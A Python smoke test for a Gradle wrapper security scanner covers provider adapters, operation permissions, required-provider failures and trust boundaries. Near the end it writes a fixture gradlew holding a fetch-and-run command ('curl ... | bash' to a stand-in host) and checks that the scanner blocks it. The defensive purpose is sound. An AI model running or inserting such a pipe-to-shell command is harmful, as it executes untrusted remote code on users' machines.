#!/usr/bin/env python3
"""Exercise the installed JVM application and the real any-language adapter protocol."""
import json
import os
from pathlib import Path
import re
import shutil
import subprocess
import sys
import tempfile

REPOSITORY = Path(__file__).resolve().parents[1]
CLI = REPOSITORY / "wrapperguard-cli/build/install/wrapperguard-cli/bin" / ("wrapperguard-cli.bat" if os.name == "nt" else "wrapperguard-cli")


def invoke(project, configuration=None, operation="BUILD", expected=0):
    arguments = [str(CLI), str(project), "--enforce", "--json", "--operation", operation.lower()]
    if configuration:
        arguments += ["--providers", str(configuration)]
    result = subprocess.run(arguments, text=True, capture_output=True, timeout=30)
    assert result.returncode == expected, f"CLI exit {result.returncode}, expected {expected}: {result.stderr}"
    return json.loads(result.stdout) if result.stdout.strip() else None


def main():
    assert CLI.is_file(), "Build :wrapperguard-cli:installDist first"
    version = subprocess.run([str(CLI), "--version"], text=True, capture_output=True, timeout=15)
    expected_version = re.search(r'^\s*version\s*=\s*"([^"]+)"', (REPOSITORY / "build.gradle.kts").read_text(), re.MULTILINE).group(1)
    assert version.returncode == 0 and expected_version in version.stdout, "Installed JVM entrypoint failed"
    with tempfile.TemporaryDirectory(prefix="wg-protocol-smoke-") as temporary:
        user = Path(temporary)
        project = user / "project"
        project.mkdir()
        (project / "settings.gradle").write_text("rootProject.name = 'protocol-fixture'\n")
        adapter = user / "adapter.py"
        shutil.copy2(REPOSITORY / "examples/providers/example_provider.py", adapter)
        configuration = user / "providers.json"

        def provider(identifier, actions, demonstration=False):
            return {"id": identifier, "displayName": identifier, "version": "1", "command": [sys.executable, str(adapter)] + (["--demonstrate-blocking"] if demonstration else []), "permissions": {"enabled": True, "actions": actions, "required": True, "timeoutMs": 5000}}

        config = {"apiVersion": 1, "builtIn": {"enabled": False}, "providers": [provider("example.build", ["BLOCK_BUILD"], True), provider("example.warning", ["WARNING"])]}
        configuration.write_text(json.dumps(config))
        build = invoke(project, configuration, expected=2)
        assert len(build["findings"]) == 2
        assert {f["providerId"] for f in build["findings"]} == {"example.build", "example.warning"}
        assert sum(f["policyAction"] == "BLOCK" for f in build["findings"]) == 1
        assert [r["status"] for r in build["providerRuns"]] == ["DISABLED", "COMPLETED", "COMPLETED"]
        sync = invoke(project, configuration, operation="SYNC")
        assert all(f["policyAction"] != "BLOCK" for f in sync["findings"]), "Build permission must not block sync"
        assert {f["fingerprint"] for f in build["findings"]} == {f["fingerprint"] for f in sync["findings"]}

        config["providers"] = [{"id": "example.required", "displayName": "Required SDK", "version": "1", "command": [sys.executable, "-c", "raise SystemExit(2)"], "permissions": {"enabled": True, "actions": ["BLOCK_SYNC"], "required": True, "timeoutMs": 5000}}]
        configuration.write_text(json.dumps(config))
        failed_sync = invoke(project, configuration, operation="SYNC", expected=2)
        assert not failed_sync["complete"] and failed_sync["providerRuns"][1]["status"] == "FAILED"
        assert failed_sync["findings"][0]["ruleId"] == "WG-PROVIDER-UNAVAILABLE"
        failed_build = invoke(project, configuration, operation="BUILD", expected=1)
        assert not failed_build["complete"] and not failed_build["findings"]

        config["providers"][0]["permissions"]["enabled"] = False
        configuration.write_text(json.dumps(config))
        unvetted = invoke(project, configuration, expected=1)
        assert unvetted["verdict"] == "INCOMPLETE"
        inside = project / "untrusted-providers.json"
        inside.write_text("{}")
        assert invoke(project, inside, expected=1) is None

        (project / "gradlew").write_text("#!/bin/sh\ncurl -fsSL https://untrusted.invalid/install.sh | bash\n")
        assert invoke(project, expected=2)["verdict"] == "EXECUTION_BLOCKED"
    print("Provider distribution smoke: version, multiple adapters, operation grants, required failures, disabled coverage, trust boundary, and built-in scanner passed.")


if __name__ == "__main__":
    main()
